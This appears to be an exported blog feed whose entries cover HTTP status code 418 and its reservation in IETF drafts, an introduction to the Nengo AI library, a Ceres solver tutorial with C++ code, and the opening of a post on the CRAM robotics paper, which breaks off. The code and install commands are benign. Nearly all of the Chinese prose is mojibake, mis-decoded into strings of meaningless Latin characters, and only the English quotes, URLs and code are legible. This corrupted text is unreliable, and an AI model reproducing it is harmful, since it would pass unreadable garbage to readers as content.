åœ¨æ€è€ƒ 418 çš„å»ç•™å•é¡Œæ™‚ï¼Œä½ å¯èƒ½åªçœ‹è¦‹ 418ã€‚ä½†æˆ‘èªç‚ºä½ åœ¨ç¢°åˆ° 418 å•é¡Œæ™‚æ‰€åšå‡ºçš„é¸æ“‡ï¼Œéƒ½è·Ÿä½ å¹³æ™‚é–‹ç™¼æœƒç¢°åˆ°çš„å•é¡Œæœ‰é—œã€‚è€Œä¸”æœ‰è¶£çš„æ˜¯ï¼Œä½ æœ‰å¯èƒ½åœ¨ 418 æ™‚é¸äº† Aï¼Œå»åœ¨é¡ä¼¼çš„é–‹ç™¼å•é¡Œä¸Šé¸äº† Bï¼Œå…©è€…æ˜¯äº’ç›¸è¡çªçš„ã€‚
ä»¥æˆ‘å€‹äººçš„ç«‹å ´ä¾†èªªï¼Œ418 ä¸åœ¨æ¨™æº–å…§é€™å€‹ç†ç”±å¾ˆæœ‰åŠ›ã€‚ä¸éä»¥æƒ…æ„Ÿä¸Šä¾†èªªæˆ‘æ˜¯ä¸å¸Œæœ›å®ƒè¢«ç§»é™¤çš„ï¼Œå¹¸å¥½é‚„æœ‰ä¸€å€‹åå°çš„è«–é»ä¹Ÿæ»¿æœ‰åŠ›çš„ã€‚
åå°ç§»é™¤ï¼š418 å·²ç¶“è¢«èª¤ç”¨å¤ªä¹…äº†åœ¨åšç‰ˆæœ¬æ›´æ–°æ™‚ï¼Œæœ‰ä¸€å€‹å¾ˆé‡è¦çš„é»æ˜¯è¦ç¶­æŒå‘ä¸‹ç›¸å®¹ï¼ˆbackward compatibleï¼‰ï¼Œå¦‚æœä¸æ˜¯ä»€éº¼å¤ªé‡è¦çš„äº‹ï¼Œç›¡é‡ä¸è¦æœ‰ breaking changeã€‚
è€Œé€™å€‹è«–é»è¬›çš„æ˜¯ 418 ä½œç‚ºä¸€å€‹ã€Œè¢«èª¤èªç‚ºæ˜¯ HTTP æ¨™æº–ã€çš„ç‹€æ…‹ç¢¼å·²ç¶“åå¹¾å¹´äº†ï¼Œæ‰€ä»¥æ¯ä¸€å€‹ä¸»æµçš„å‡½å¼åº«å¹¾ä¹éƒ½æœ‰æ”¯æ´ 418ï¼ˆä½ çœ‹ Node.js è·Ÿ Go éƒ½æœ‰æ”¯æ´ï¼‰ï¼Œè‹¥æ˜¯ä»Šå¤©æŠŠ 418 çš„æ”¯æ´æ‹”æ‰äº†ï¼Œé‚£ä»¥å‰ä½¿ç”¨åˆ° 418 çš„ Server æ€éº¼è¾¦ï¼Ÿ  
é€™è«–é»æˆ‘ä¹Ÿè¦ºå¾—æ»¿æœ‰åŠ›çš„ï¼Œ418 å·²ç¶“è¢«èª¤ç”¨å¤ªä¹…ï¼Œæ‹”æ‰ä¹‹å¾Œæœƒç”¢ç”Ÿçš„å•é¡Œä¼¼ä¹æ¯”ç¶­æŒç¾ç‹€é‚„è¦å¤šã€‚å¾é€™é»ä¾†çœ‹ï¼Œå®ƒæ˜¯ä¸è©²è¢«ç§»é™¤çš„ã€‚
418 çš„å¾ŒçºŒç™¼å±•åŠç¾æ³ç•¶åˆ Mark Nottingham ç™¼è¡¨äº†å¸Œæœ›ç§»é™¤ 418 çš„ Issue ä¹‹å¾Œï¼Œæœ‰äº›äººè¦ºå¾—ä»–æ˜¯ä¾†é¬§çš„ï¼Œåƒé£½å¤ªé–’æ‰æœƒæŠŠæƒ³æ³•å‹•åˆ° 418 èº«ä¸Šå»ã€‚
ä½†å¦‚æœä½ é»é€²ä»–çš„ GitHubï¼Œå¯ä»¥çœ‹åˆ°ä»–çš„è‡ªæˆ‘ä»‹ç´¹ï¼š

I work on HTTP specifications and implementations.

ä»–åŸæœ¬å°±åƒèˆ‡äº†å„å€‹è·Ÿ HTTP æ¨™æº–ç›¸é—œçš„çµ„ç¹”ï¼Œè€Œä¸”åœ¨é€™å€‹é ˜åŸŸåšäº†ä¸å°‘çš„è²¢ç»ã€‚
åœ¨ç¤¾ç¾¤æ€èµ·äº†åå°è²æµªä»¥å¾Œï¼Œä»–ä¹Ÿæ±ºå®šå¾åŸæœ¬çš„ç§»é™¤ 418 è½‰è®Šç‚ºä¿ç•™ 418 çš„ç«‹å ´ï¼š

So, I poked a couple of implementations to see if theyâ€™d remove 418â€™s â€œteapotâ€ semantics, and there was a reaction (to put it mildly).


I think we need to reserve 418 to make it clear it canâ€™t be used for the foreseeable future

ï¼ˆä¾†æºï¼šhttp-wg çš„ mailing list: Reserving 418
ï¼‰
æ–¼æ˜¯èµ·è‰äº†ä¸€ä»½æ–‡ä»¶ï¼šReserving the 418 HTTP Status Codeï¼Œè£¡é¢èªªæ˜è¦æŠŠ 418 çš„ç‹€æ…‹è¨­å®šç‚ºä¿ç•™ï¼Œä¸èƒ½è¢«å…¶ä»–äººè¨»å†Šèµ°ï¼š

[RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of the application-specific 418 (Iâ€™m a Teapot) status code.


In the intervening years, this status code has been widely implemented as an â€œeaster eggâ€, and therefore is effectively consumed by this use.


This document changes 418 to the status of â€œReservedâ€ in the IANA HTTP Status Code registry to reflect that.

ç•¶åˆç ”ç©¶é€™æ•´ä»¶äº‹æƒ…åˆ°é€™è£¡æ™‚ï¼Œçœ‹åˆ°é€™ä»½è‰ç¨¿çš„è³‡è¨Šç™¼ç¾å·²ç¶“éæœŸäº†ï¼ˆExpires: February 12, 2018ï¼‰ï¼Œåˆ° IANA HTTP Status Code registry çœ‹ï¼Œç™¼ç¾ 418 ä¸€æ¨£æ˜¯ Unassignedã€‚
ç·šç´¢å°±åˆ°é€™é‚Šå…¨éƒ¨æ–·æ‰äº†ï¼Œæ‰€ä»¥ 418 æœ€å¾Œåˆ°åº•æ€éº¼æ¨£äº†ï¼Ÿæœƒè®Šæˆä¿ç•™ä¸­å—ï¼Ÿ
æ–¼æ˜¯æˆ‘å¯«äº†å°ä¿¡å»å• Mark Nottingham æœ¬äººï¼Œä»–åªä¸Ÿçµ¦æˆ‘ä¸€å€‹é€£çµï¼šhttps://github.com/httpwg/http-core/issues/43ã€‚
å¾é€™å€‹ Issue å¯ä»¥æ‰¾åˆ°é€™å€‹ PRï¼šReserve 418 status codeï¼Œè£¡é¢æ›´å‹•äº†draft-ietf-httpbis-semantics-latest.xmlé€™å€‹æª”æ¡ˆã€‚è€Œåœ¨ httpwg çš„ç¶²ç«™ä¸Šä¹Ÿå¯ä»¥æ‰¾åˆ°ç¾åœ¨æœ€æ–°çš„è‰ç¨¿ï¼šhttps://httpwg.org/http-core/draft-ietf-httpbis-semantics-latest.htmlã€‚
åœ¨æœ€æ–°çš„è‰ç¨¿è£¡é¢ï¼Œå¤šäº†é€™æ®µï¼š

9.5.19. 418 (Unused)
[RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of an application-specific 418 status code. In the intervening years, this status code has been widely implemented as an â€œEaster Eggâ€, and therefore is effectively consumed by this use.


Therefore, the 418 status code is reserved in the IANA HTTP Status Code registry. This indicates that the status code cannot be assigned to other applications currently. If future circumstances require its use (e.g., exhaustion of 4NN status codes), it can be re-assigned to another use.

çœ‹èµ·ä¾†æ˜¯æŠŠ 418 å…ˆä¿ç•™èµ·ä¾†ï¼Œä½†å¦‚æœæ—¥å¾Œ 4XX çš„ç‹€æ…‹ç¢¼çœŸçš„ç”¨å®Œï¼Œé‚„æ˜¯å¯ä»¥æŠŠ 418 æ‹¿å»åšå…¶ä»–çš„ç”¨é€”ã€‚
è€Œ httpwg çš„ç¶²ç«™ä¸Šä¹Ÿèƒ½æ‰¾åˆ°ç›®å‰æœ€æ–°çš„ HTTP&#x2F;1.1 çš„æ¨™æº–ï¼šHypertext Transfer Protocol (HTTP&#x2F;1.1): Semantics and Contentï¼Œè£¡é¢æ˜¯æ²’æœ‰ 418 çš„ã€‚
å› æ­¤æˆ‘è‡ªå·±çš„çŒœæ¸¬æ˜¯åœ¨æœ€æ–°çš„è‰ç¨¿è£¡é¢å·²ç¶“æŠŠ 418 æ”¾é€²å»äº†ä¸¦ä¸”è¨­æˆä¿ç•™ï¼Œä½†æ˜¯é‚„æ²’æœ‰æ­£å¼ç™¼è¡¨ï¼ˆèƒŒå¾Œæ‡‰è©²é‚„æœ‰ä¸€å †æµç¨‹ï¼Œé€™éƒ¨åˆ†è¦å»ç ”ç©¶ HTTP Working Group çš„è¦ç« æ‰èƒ½çŸ¥é“ï¼‰ï¼Œä¸éåœ¨æ—¥å¾Œæ‡‰è©²å¯ä»¥çœ‹è¦‹è‰ç¨¿ç™¼å¸ƒä¸¦æˆç‚ºæ­£å¼çš„æ¨™æº–ã€‚
ç¸½çµé€™æ¨£çœ‹ä¸‹ä¾†ï¼Œ418 I am a teapot ä¾èˆŠä¸æœƒæ˜¯ HTTP çš„æ¨™æº–ã€‚ç•¢ç«Ÿæ‡‰è©²æœ‰äº›äººè·Ÿæˆ‘æƒ³çš„ä¸€æ¨£ï¼Œåªè¦æŠŠ 418 I am a teapot è®Šæˆ HTTP æ¨™æº–çš„ä¸€éƒ¨åˆ†ï¼Œå•é¡Œå°±è§£æ±ºäº†ï¼Œä½†æœ€å¾Œæ²’æœ‰é€™æ¨£åšæˆ‘çŒœæ˜¯æœƒç¢°åˆ°ä¸€äº›å•é¡Œï¼ˆè‡³æ–¼æ˜¯ä»€éº¼å•é¡Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œæœ‰äººçŸ¥é“çš„è©±éº»ç…©æé»ï¼Œæ„Ÿè¬ï¼‰ã€‚
æœ€å¾Œçš„çµè«–æ‡‰è©²æ˜¯ 418 é€™å€‹ç‹€æ…‹ç¢¼ä¾ç„¶æœƒç¹¼çºŒä»¥ I am a teapot å­˜åœ¨æ–¼å„å€‹ä¸»æµçš„ HTTP å¯¦ä½œè£¡é¢ï¼Œä½†ä¾èˆŠä¸æ˜¯ HTTP æ¨™æº–çš„ä¸€éƒ¨åˆ†ã€‚åœ¨æ¨™æº–è£¡é¢ 418 ç‹€æ…‹ç¢¼æ˜¯è¢«è¨­å®šç‚º (Unused) è€Œä¸”æš«æ™‚è¢«ä¿ç•™è‘—ï¼Œä¸æœƒè¢«å…¶ä»–ç”¨é€”çµ¦å–ä»£ã€‚
é€™ç¯‡çš„ç›®çš„ä¸»è¦å°±æ˜¯æƒ³è¨˜éŒ„ä¸€ä¸‹ 418 ç‹€æ…‹ç¢¼çš„éå»ä»¥åŠç¾åœ¨ï¼Œä¸¦ä¸”è®“å¤§å®¶çŸ¥é“å®ƒä¸¦ä¸æ˜¯ HTTP æ¨™æº–çš„ä¸€éƒ¨åˆ†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨ç ”ç©¶çš„éç¨‹ä¸­ä¹Ÿè¯æƒ³åˆ°äº†è¨±å¤šé–‹ç™¼ä¸Šæœƒç¢°åˆ°çš„å•é¡Œï¼Œå…¶å¯¦èƒŒå¾Œçš„æ ¸å¿ƒæ¦‚å¿µéƒ½æ˜¯å·®ä¸å¤šçš„ã€‚
å…¶å¯¦åœ¨å¯«é€™ç¯‡çš„æ™‚å€™çŒ¶è±«äº†è¨±ä¹…ï¼Œå› ç‚ºå¾ˆæ€•è‡ªå·±æœ‰åœ°æ–¹æœƒå¯«éŒ¯ï¼ˆåƒè€ƒè³‡æ–™å¤ªå¤šå¤ªè±å¯Œï¼‰ï¼Œä¸éæƒ³èµ·äº†ä¹‹å‰å¿˜è¨˜åœ¨å“ªçœ‹åˆ°çš„ä¸€å¥è©±ï¼šã€Œæ¯”èµ·æå•ï¼Œæœ‰å€‹æ›´å¿«èƒ½å¾—åˆ°æ­£ç¢ºç­”æ¡ˆçš„æ–¹æ³•ã€‚é‚£å°±æ˜¯è¬›ä¸€å€‹éŒ¯çš„ç­”æ¡ˆï¼Œå°±æœƒæœ‰äººä¾†ç³¾æ­£ä½ äº†ã€ã€‚
å»¶ä¼¸é–±è®€ï¼š

HN çš„è¨è«–
HN çš„è¨è«– - 2 

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Nengo AI å…¥é–€</title>
    <url>/2019/05/10/intro-nengo/</url>
    <content><![CDATA[å‰è¨€ä»Šå¤©è¦è·Ÿå¤§å®¶ä»‹ç´¹ä¸€å€‹å«åš Nengo AI çš„ Python å‡½å¼åº«ï¼Œé€™å€‹å‡½å¼åº«ä¸»è¦æä¾›çš„åŠŸèƒ½å°±æ˜¯è®“äººå¯ä»¥å»ºç«‹åˆ†æ•£å¼çš„ AI ç³»çµ±ï¼Œå¯ä»¥æƒ³åƒæˆæ›´åŠ é¾å¤§ã€åŠŸèƒ½ä¹Ÿæ›´å¼·å¤§çš„ AIã€‚å¤§å®¶å¯ä»¥çœ‹ä¸€ä¸‹ä»‹ç´¹å½±ç‰‡ï¼š

å®‰è£å®‰è£çš„æ­¥é©Ÿæ»¿ç°¡å–®çš„ï¼Œä¸€è¡Œ pip install nengo å°±æå®šã€‚
(C:\Users\rosindigo\Anaconda3\envs) C:\Users\rosindigo\PycharmProjects\nengo&gt;pip install nengoCollecting nengoUsing cached https://files.pythonhosted.org/packages/f7/ce/e314e1176bfbbe6c3b6cf4e8fa0620cafad8f8bad04203c55881e9cb2fb0/nengo-2.8.0-py2.py3-none-any.whlCollecting numpy&gt;=1.8 (from nengo)Downloading https://files.pythonhosted.org/packages/2e/11/f006363050b24fb19a235e5efd219e7ac549398d531110d80b8f2ba3a909/numpy-1.16.3-cp36-cp36m-win_amd64.whl (11.9MB)|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 11.9MB 233kB/sInstalling collected packages: numpy, nengoSuccessfully installed nengo-2.8.0 numpy-1.16.3

å®‰è£å®Œæˆä¹‹å¾Œï¼Œä½ å¯ä»¥å…ˆ import nengo çœ‹çœ‹æ˜¯ä¸æ˜¯å¯ä»¥æˆåŠŸï¼š
import nengomodel = nengo.Network()

å› ç‚º nengo é™¤äº† core ä¹‹å¤–ï¼Œé‚„æœ‰ä¸åŒçš„ moduleï¼Œå¦‚æœä¹Ÿæƒ³è¦å®‰è£çš„è©±ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢çš„ command templateï¼š
pip install nengo[optional] # Additional solvers and speedupspip install nengo[docs] # For building docspip install nengo[tests] # For running the test suitepip install nengo[all] # All of the above

ç°¡å–®ç†è§£ Nengo çš„æ¶æ§‹ä¸‹é¢é€™å¼µåœ–å¾ˆæ¸…æ¥šåœ°å±•ç¤ºäº† Nengo å¾ Model å±¤åˆ° Hardware å±¤çš„å„å€‹ moduleï¼ŒåŸºæœ¬ä¸Šä½ å¯ä»¥èªªåªè¦ç”¨ Nengoï¼Œå°±å¯ä»¥é–‹ç™¼å‡ºåœ¨å„ç¨®ç¡¬é«”ä¸ŠåŸ·è¡Œçš„ AI ç³»çµ±ã€‚

ç¨‹å¼ç¯„ä¾‹æ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘çœ‹ä¸€å€‹éå¸¸ç°¡å–®çš„ç¯„ä¾‹å°ç¨‹å¼ï¼ˆæˆ‘å°±ç›´æ¥æŠŠèªªæ˜å¯«åœ¨è¨»è§£è£¡é¢å•¦ï¼‰ï¼š
import nengoimport numpy as np  if __name__ == &quot;__main__&quot;:  # å‰µå»ºä¸€å€‹æ–°çš„ network  # åœ¨ Nengo ä¸­ï¼Œä»»ä½• model éƒ½æ˜¯è¢«åŒ…å«åœ¨ Network ä¸­  model = nengo.Network()   # å»ºç«‹ä¸€å€‹æœ‰ 40 å€‹ neuron çš„ Nengo object - my_ensemble  # object æ˜¯ model çš„ä¸€éƒ¨åˆ†(ä½ å¯ä»¥å»ºå¤šå€‹ object)  # ç”¨ with model æ˜¯ç‚ºäº†è®“ Nengo çŸ¥é“é€™å€‹ object å±¬æ–¼å“ªå€‹ model  with model:    my_ensemble = nengo.Ensemble(n_neurons=40, dimensions=1)     # sin_input_node æœƒè¼¸å‡ºä¸€å€‹ sine æ³¢è¨Šè™Ÿ    sin_input_node = nengo.Node(output=np.sin)     # å°‡ sin_input_node çš„è¼¸å‡ºé€çµ¦ my_ensemble    nengo.Connection(sin_input_node, my_ensemble)   # ä¸€æ—¦å»ºç«‹å¥½ objectï¼Œä¹ŸæŒ‡å®šäº†è£¡é¢çš„ data è¦æ€éº¼æµå‹•  # é€™æ™‚å€™å°±å¯ä»¥ç”¨ Probe ä¾†æŒ‡å®šè¦æ”¶é›†å“ªé‚Šçš„ data  my_probe = nengo.Probe(my_ensemble)   # è¦æ¨¡æ“¬ä¹‹å‰ï¼Œè¦å…ˆç”¨ model å»ºç«‹ä¸€å€‹ Simulator  sim = nengo.Simulator(model)   # è·‘æ¨¡æ“¬ï¼Œä¸¦å°å‡ºæ¨¡æ“¬çµæœ  sim.run(5.0)  print(sim.data[my_probe][-10:])

å¦‚æœæƒ³è¦å° Neural Engineering Framework æœ‰æ›´æ·±å…¥çš„äº†è§£ï¼Œå¯ä»¥çœ‹çœ‹é€™ç¯‡ä»‹ç´¹ - A Technical Overview of the Neural Engineering Frameworkã€‚
ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº† Nengo é€™å€‹ AI ç³»çµ±çš„é–‹ç™¼æ¡†æ¶ï¼Œå€‹äººè¦ºå¾—é€™å€‹æ¡†æ¶çš„æ½›åŠ›é‚„æ»¿å¤§çš„ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥åƒè€ƒå»¶ä¼¸é–±è®€æä¾›çš„æ›´å¤šæ•™æï¼Œå…ˆå­¸ç¿’å»ºç«‹è¤‡é›œåº¦æ›´é«˜çš„ modelï¼Œå†é€²ä¸€æ­¥åšå‡ºè‡ªå·±æƒ³è¦çš„ modelã€‚
å»¶ä¼¸é–±è®€
Nengo Documentation
NengoDL: Combining deep learning and neuromorphic modelling methods
Biospaun: a large-scale behaving brain model with complex neurons

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Nengo AI</tag>
        <tag>Neural Network</tag>
        <tag>Deep Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceres å‡½å¼åº«ç°¡ä»‹</title>
    <url>/2017/12/31/intro-to-ceres-solver/</url>
    <content><![CDATA[å‰è¨€Ceres æ˜¯ç”¨ä¾†æ±‚è§£ Optimization å•é¡Œçš„ C++ é–‹æºå‡½å¼åº«ï¼Œæ˜¯ç”± Google æ‰€é‡‹å‡ºçš„ï¼Œæ–‡ä»¶ç›¸ç•¶å®Œæ•´ï¼Œè€Œä¸”é€™å€‹å‡½å¼åº«é‚„æœ‰ä¸å°‘ å¥½è™•(ä¾‹å¦‚ code å“è³ªã€ä½¿ç”¨çš„æ–¹ä¾¿æ€§ç­‰ç­‰)ã€‚
ä»Šå¤©æˆ‘å€‘æœƒä¸€èµ·ä¾†çœ‹çœ‹æ€éº¼å®‰è£ Ceresï¼Œä¸¦ç”¨ Ceres ä¾†æ±‚è§£ä¸€å€‹æœ€ç°¡å–®çš„å•é¡Œã€‚
å®‰è£ Ceres (in Linux)ä¸€é–‹å§‹å‘¢ï¼Œè¦å…ˆå®‰è£ä¸€äº› Ceres æœƒä½¿ç”¨åˆ°çš„å‡½å¼åº«ï¼›
sudo apt-get install liblapack-dev libsuitesparse-dev libcxsparse3.1.2 libgflags-dev libgoogle-glog-dev libgtest-dev

æ¥ä¸‹ä¾†ï¼Œå°±æ˜¯å®‰è£ Ceres äº†ï¼›
git clone https://github.com/ceres-solver/ceres-solver.gitmkdir ceres-bincd ceres-bincmake ../ceres-solvermake -j3make testsudo make install

åªè¦æŠŠ 78 å€‹ test éƒ½è·‘éå°±ç®—æ˜¯å®‰è£æˆåŠŸå›‰ï¼
ä½¿ç”¨ Ceres ä¾†æ±‚è§£ä¸€å€‹è¶…ç°¡å–®çš„æ–¹ç¨‹å¼åŸºæœ¬ä¸Šï¼ŒCeres æ˜¯ç”¨ä¾†æ±‚è§£ä¸‹åˆ—æ–¹ç¨‹å¼çš„ least-squared error è§£ï¼š

é€™ç¨®æ–¹ç¨‹å¼åœ¨æ»¿å¤šæ‡‰ç”¨ä¸­éƒ½æœƒç¢°åˆ°ï¼Œä¾‹å¦‚ SLAM æ±‚è§£å…©å€‹ keyframe ä¸­çš„ transformï¼Œä½¿ pixel é–“çš„èª¤å·®æœ€å°ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œf() å¯ä»¥æ˜¯ä¸€å€‹éç·šæ€§çš„å‡½æ•¸ï¼Œä¹Ÿå°±æ˜¯èªªä½ åªéœ€è¦æŠŠæƒ³æ±‚è§£çš„å‡½å¼å¯«å‡ºä¾†ï¼ŒCeres å°±å¯ä»¥å¹«ä½ è§£ï¼Œå¦‚æœä¸èƒ½ formulate æˆç·šæ€§å‡½æ•¸ä¹Ÿæ²’æœ‰é—œä¿‚ã€‚
é‚£å¾å®˜ç¶²ä¸Šå¯ä»¥çœ‹åˆ°ä¸€å€‹æœ€æœ€æœ€ç°¡å–®çš„ä¾‹å­ï¼Œæ±‚è§£å¦‚ä¸‹æ–¹ç¨‹å¼çš„æœ€å°å€¼ï¼š

é›–ç„¶æˆ‘å€‘ä¸€çœ‹å°±çŸ¥é“ï¼Œç­”æ¡ˆå°±æ˜¯ x&#x3D;10 æ™‚å¯ä»¥é”åˆ°æœ€å°å€¼ 0ï¼Œä½†è¦æ€éº¼ç”¨ Ceres ä¾†è§£å‘¢ï¼Ÿ
åšæ³•æœƒæ˜¯è¦å…ˆå®šç¾©ä¸€å€‹ functorï¼Œè®“æ±‚è§£éç¨‹ä¸­å¯ä»¥ä½¿ç”¨é€™å€‹ functor ä¾†è¨ˆç®—ç•¶å‰è§£çš„èª¤å·®ï¼š
struct CostFunctor &#123;   template &lt;typename T&gt;   bool operator()(const T* const x, T* residual) const &#123;     residual[0] = T(10.0) - x[0];     return true;   &#125;&#125;;

æœ‰äº†é€™å€‹è¨ˆç®— residual çš„ functor å¾Œï¼Œæ¥ä¸‹ä¾†å°±æ˜¯è¦å®šç¾©å•é¡Œè·Ÿæ±‚è§£ï¼Œè®“æˆ‘å€‘ç›´æ¥çœ‹ helloworld.cc çš„ç¨‹å¼ç¢¼å§ï¼š
#include &quot;ceres/ceres.h&quot;#include &quot;glog/logging.h&quot;  //æœƒä½¿ç”¨åˆ°çš„ functionusing ceres::AutoDiffCostFunction;using ceres::CostFunction;using ceres::Problem;using ceres::Solver;using ceres::Solve;  // ç¬¬ä¸€æ­¥è¦å…ˆå®šç¾©çš„ functorstruct CostFunctor &#123;  template &lt;typename T&gt; bool operator()(const T* const x, T* residual) const &#123;    residual[0] = 10.0 - x[0];    return true;  &#125;&#125;;  int main(int argc, char** argv) &#123;  google::InitGoogleLogging(argv[0]);    // è¨­å®šæƒ³è¦æ±‚è§£çš„è®Šæ•¸åˆå§‹å€¼  double x = 0.5;  const double initial_x = x;    // åˆå§‹åŒ– problem  Problem problem;    // å®šç¾© cost_functionï¼Œé€™é‚Šæ˜¯ç”¨åˆ° AutoDiffCostFunction  // AutoDiffCostFunction æœƒåƒä¸Šé¢å®šç¾©çš„ functorï¼Œç„¶å¾Œç”¨ functor è£¡å¯«çš„æ–¹å¼ç®—èª¤å·®  CostFunction* cost_function =      new AutoDiffCostFunction&lt;CostFunctor, 1, 1&gt;(new CostFunctor);  // å®šç¾© problem è¦ä½¿ç”¨æˆ‘å€‘å‰›å»ºç«‹çš„ cost_function  problem.AddResidualBlock(cost_function, NULL, &amp;x);    // Run solver ä¾†è§£ problem  Solver::Options options;  options.minimizer_progress_to_stdout = true;  Solver::Summary summary;  Solve(options, &amp;problem, &amp;summary);    // è¼¸å‡ºçµæœ  std::cout &lt;&lt; summary.BriefReport() &lt;&lt; &quot;\n&quot;;  std::cout &lt;&lt; &quot;x : &quot; &lt;&lt; initial_x            &lt;&lt; &quot; -&gt; &quot; &lt;&lt; x &lt;&lt; &quot;\n&quot;;  			  return 0;&#125;

æ‰€ä»¥æ­¥é©Ÿå¤§æ¦‚å°±æ˜¯:

å®šç¾© functor
å®šç¾©æ¬²æ±‚åƒæ•¸çš„åˆå§‹å€¼
å®šç¾© cost_function ä¸¦æŒ‡å®š problem è¦ä½¿ç”¨ cost_function æ±‚è§£
è¨­å®šä¸¦åŸ·è¡Œ Solver æ±‚è§£å•é¡Œ
çœ‹çµæœ

å‡è¨­ä½ å‰›å‰›æœ‰ç·¨è­¯æˆåŠŸï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ ceres-bin\bin æ‰¾åˆ° helloworld çš„åŸ·è¡Œæª”ï¼ŒåŸ·è¡Œå¾Œçš„çµæœå¦‚ä¸‹ï¼š
iter      cost      cost_change  |gradient|   |step|    tr_ratio  tr_radius  ls_iter  iter_time  total_time   0  4.512500e+01    0.00e+00    9.50e+00   0.00e+00   0.00e+00  1.00e+04        0    7.54e-05    1.94e-03   1  4.511598e-07    4.51e+01    9.50e-04   9.50e+00   1.00e+00  3.00e+04        1    8.24e-04    3.01e-03   2  5.012552e-16    4.51e-07    3.17e-08   9.50e-04   1.00e+00  9.00e+04        1    5.95e-05    3.16e-03Ceres Solver Report: Iterations: 3, Initial cost: 4.512500e+01, Final cost: 5.012552e-16, Termination: CONVERGENCEx : 0.5 -&gt; 10

å…¶ä¸­éäº†ä¸‰æ­¥ä»–å°±è§£å‡ºäº†ç­”æ¡ˆæ˜¯ x&#x3D;10ï¼Œæ”¶æ–‚çš„é€Ÿåº¦ç®—æ˜¯æ»¿å¿«çš„ã€‚é›–ç„¶é€™å€‹å•é¡Œå…¶å¯¦æ˜¯ç·šæ€§çš„ï¼Œå¯ä»¥ä¸€æ­¥è§£å‡ºï¼Œä½†é è¨­çš„ solver æ˜¯ç”¨ä¾†è§£ non-linear optimization å•é¡Œï¼Œæ‰€ä»¥æœƒèŠ±å¥½å¹¾æ­¥ã€‚
ç¸½çµä»Šå¤©æˆ‘å€‘ç°¡å–®ä»‹ç´¹äº† Ceres é€™å€‹å‡½å¼åº«ï¼Œä¹Ÿè·‘äº†æœ€ç°¡å–®çš„ç¨‹å¼ä¾†å­¸ç¿’æ€éº¼ä½¿ç”¨ Ceresï¼Œä¹‹å¾Œå¤§å®¶å¦‚æœæœ‰é‡åˆ°è¦æ±‚è§£ non-linear optimization å•é¡Œï¼Œå°±å¯ä»¥è€ƒæ…®ä½¿ç”¨ Ceres ä¾†è§£å›‰ï¼
å»¶ä¼¸é–±è®€
ceres-solver tutorial

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨å­¸ç¿’çœ‹æ¸…äº‹ç‰©çš„æœ¬è³ªèˆ‡æ”¹é€²è‡ªå·±çš„è§€å¿µ
]]></content>
      <tags>
        <tag>Ceres</tag>
        <tag>non-linear optimization</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ä¾†è®€ CRAM - A Cognitive Robot Abstract Machine for Everyday Manipulation in Human Environments</title>
    <url>/2018/06/09/intro-to-CRAM/</url>
    <content><![CDATA[å‰è¨€å¾ˆä¹…ä»¥å‰ï¼Œæˆ‘å°±å¯«éä¸€ç¯‡ CRAM ç°¡ä»‹ï¼Œä½†æ˜¯ä¸€ç›´æ²’æœ‰æŠŠé€™å€‹å·¥å…·ç”¨èµ·ä¾†ï¼Œæ·±æ„Ÿå¯æƒœã€‚
æœ€è¿‘åˆå› ç·£éš›æœƒå¯«äº† ä¸€èµ·è®€ Knowledge-Enabled Robotic Agents for Shelf Replenishment in Cluttered Retail Environmentsï¼Œæ‰€ä»¥æƒ³è¦å†æŠŠ CRAM çš„åŸå§‹ paper æ‹¿èµ·ä¾†çœ‹ä¸€æ¬¡ï¼Œç„¶å¾Œå°‡æˆ‘æ‰€äº†è§£çš„åˆ†äº«çµ¦å¤§å®¶ã€‚
ç‚ºä»€éº¼ç™¼å±• CRAMï¼ŸCRAM è¢«ç™¼å±•å‡ºä¾†çš„åŸå› ï¼Œå°±æ˜¯å› ç‚ºæ©Ÿå™¨äººåœ¨åšæ—¥å¸¸ç”Ÿæ´»ä¸­æœƒå‡ºç¾çš„ manipulation task æ™‚ï¼Œéœ€è¦åšå¤§é‡çš„æ±ºç­–ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œæ©Ÿå™¨äººè‹¥è¦å¾æ¡Œä¸Šæ‹¿èµ·ä¸€æœ¬æ›¸ï¼Œä»–å°±è¦æ±ºå®šï¼š

è¦ç«™åœ¨å“ªé‚Šæ‰æ‹¿å¾—åˆ°æ›¸ï¼Ÿ
